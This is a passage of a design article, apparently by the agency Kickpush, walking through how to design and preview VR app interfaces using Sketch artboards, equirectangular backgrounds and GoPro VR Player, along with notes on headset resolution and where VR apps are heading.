what a 360 degree environment looks like when flattened  This representation is called an equirectangular projection  In a 3D virtual environment  these projections are wrapped around a sphere to mimic the real world   The full width of the projection represents 360 degrees horizontally and 180 degrees vertically  We can use this to define the pixel size of the canvas  3600   1800   Working with such a big size can be a challenge  But because we re primarily interested in the interface aspect of VR apps  we can concentrate on a segment of this canvas   Building on Mike Alger s early research on comfortable viewing areas  we can isolate a portion where it makes sense to present the interface   The area of interest represents one ninth of the 360 degree environment  It s positioned right at the centre of the equirectangular image and is 1200   600 pixels in size   Let s sum up     360 View    3600   1800 pixels     3600   1800 pixels  UI View   1200   600 pixels  Testing  The reason for using 2 canvases for a single screen is testing  The  UI View  canvas helps to keep our focus on the interface we re crafting and makes it easier to design flows   Meanwhile  the  360 View  is used to preview the interface in a VR environment  To get a real sense of proportions  testing the interface with a VR headset is necessary   Tools  Before we get started with the walkthrough  here are the tools we ll need   Sketch   We ll use Sketch to design our interfaces and user flows  If you don t have it  you can download a trial version  Sketch is our preferred interface design software     We ll use Sketch to design our interfaces and user flows  If you don t have it  you can download a trial version  Sketch is our preferred interface design software  GoPro VR Player  GoPro VR Player is a 360 degree content viewer  It s provided by GoPro and is free  We ll use it to preview our designs and test them in context   GoPro VR Player is a 360 degree content viewer  It s provided by GoPro and is free  We ll use it to preview our designs and test them in context  Oculus Rift  Hooking Oculus Rift into the GoPro VR Player will enable us to test the design in context   A process for VR interface design  In this section  we ll run through a short tutorial on how to design a VR interface  We ll design a simple one together  which shouldn t take longer than 5 minutes   Download the assets pack  ZIP file   which contains presized UI elements and the background image  If you want to use your own assets  go for it it won t be a problem   1  Set up  360 View   First things first  Let s create the canvas that will represent the 360 degree view  Open a new document in Sketch  and create an artboard  3600   1800 pixels   Import the file named background jpg   and place it in the middle of the canvas  If you re using your own equirectangular background  make sure its proportions are 2 1  and resize it to 3600   1800 pixels   2  Set up artboard  As mentioned above  the  UI View  is a cropped version of the  360 View  and focuses on the VR interface only   Create a new artboard next to the previous one  1200   600 pixels  Then  copy the background that we just added to our  360 View   and place it in the middle of our new artboard  Don t resize it  We want to keep a cropped version of the background here   3  Design the interface  We re going to design our interface on the  UI View  canvas  We ll keep things simple for the sake of this exercise and add a row of tiles  If you re feeling lazy  just grab the file named tile png in the assets pack and drag it into the middle of the UI view   Duplicate it  and create a row of 3 tiles   Grab kickpush logo png from the assets pack  and place it above the tiles   Looking pretty good  eh   4  Merge artboards and export  Now for the fun stuff  Make sure the  UI View  artboard is above the  360 View  artboard in the layers list on the left   Drag the  UI View  artboard to the middle of the  360 View  artboard  Export the  360 View  artboard as a PNG  the  UI View  will be on top of it   5  Test it in VR  Open the GoPro VR Player and drag the  360 View  PNG that you just exported into the window  Drag the image with your mouse to preview your 360 degree environment   We re done  Pretty simple when you know how  right   If you have an Oculus Rift set up on your machine  then the GoPro VR Player should detect it and allow you to preview the image using your VR device  Depending on your configuration  you might have to mess around with the display settings in MacOS   Technical considerations  Low resolution  The resolution of the VR headset is pretty bad  Well  that s not entirely true  It s equivalent to your phone s resolution  However  considering the device is 5 centimeters from your eyes  the display doesn t look crisp   To get a crisp VR experience  we would need an 8K display per eye  That s a 15 360   7680 pixel display  We re pretty far off from that  but we ll get there eventually   Text readability  Because of the display s resolution  all of your beautifully crisp UI elements will look pixelated  This means  first  that text will be difficult to read and  secondly  that there will be a high level of aliasing on straight lines  Try to avoid using big text blocks and highly detailed UI elements   Finishing touches Blueprint  Remember the blueprint from our mobile app design process  We ve adapted this practice to VR interfaces  Using our UI views  we map and organize our flows into a comprehensible blueprint  ideal for developers to understand the overall architecture of the app we ve designed   Motion design  Designing a beautiful UI is one thing  Showing how it s supposed to animate is a different story  Once again  we ve decided to approach it with a 2 dimensional perspective   Using our Sketch designs  we animate the interface with Adobe After Effects and Principle  While the outcome is not a 3D experience  it s used as a guideline for the development team and to help our clients understand our vision at an early stage of the process   We know what you re thinking  though   That s cool  but VR apps can get way more complicated   Yes  they can  The question is  to what extent can we apply our current UX and UI practices to this new medium   How far can VR UIs go   Inter your faces  Some VR experiences rely so heavily on the virtual environment that a traditional interface that sits on top might not be the optimal way for the user to control the app  In this case  you might want users to interact directly with the environment itself   Imagine that you re making an app for a luxury travel agent  You d want to transport the user to potential holiday destinations in the most vivid way possible  So  you invite the user to put on the headset and begin the experience in your swanky Chelsea office   To transition from the office to some far away place  the user needs to choose where they want to go  They could pick up a travel magazine and flick through it until they land on an appealing page  Or there could be a collection of interesting objects on your desk that whisk the user to different locations depending on which one they pick up   This is definitely cool  but there are some drawbacks  To get the full effect  you d need a more advanced VR headset with handheld controllers  Plus  an app like this takes quite a bit more effort to develop than a set of well presented options organized like in a traditional app interface   Viva la revoluci n   The reality is that these immersive experiences are not commercially viable for most companies  Unless you ve got virtually unlimited resources  like Valve and Google  creating an experience like the one described above is probably too costly  too risky  and too time consuming   This kind of experience is brilliant for showing off that you re at the cutting edge of media and technology  but not so great for taking your product to market through a new medium  Accessibility is important   Usually  when a new format emerges  it s pushed to the limit by early adopters  the creators and innovators of this world  In time  and with enough learning and investment  it becomes accessible to a wider range of potential users   As VR headsets become more commonplace  companies will start to spot opportunities to integrate VR into the ways that they engage with customers   From our perspective  VR apps with intuitive UIs that is  UIs closer to what people are already accustomed to with their wearables  phones  tablets and computers are what will make VR an affordable and worthwhile investment for the majority of companies that pursue it   Time to board the rocketship  We hope we ve made the VR space a bit less scary with this article and inspired you to start designing for VR yourself   They say that if you want to travel fast  go alone  But if you want to travel far  travel together  We want to travel far  At Kickpush  we think that every company will have a VR app someday  just like every company now has a mobile website  or should have it s 2017  dang it     So  we re building a rocketship  a joint effort by designers around the globe to boldly go where no designer has gone before  The sooner that producing VR apps make sense for companies  the sooner the whole ecosystem will blow up   Our next challenges as digital product designers are more complex applications and handling other types of input through controllers  To begin to tackle this we ll need robust prototyping tools that let us create and test designs quickly and easily  We ll be writing a follow up article that looks at some of the early attempts to do this  and at some of the new tools in development   Stay tuned   This post was originally published by Smashing Magazine   Read more about VR design
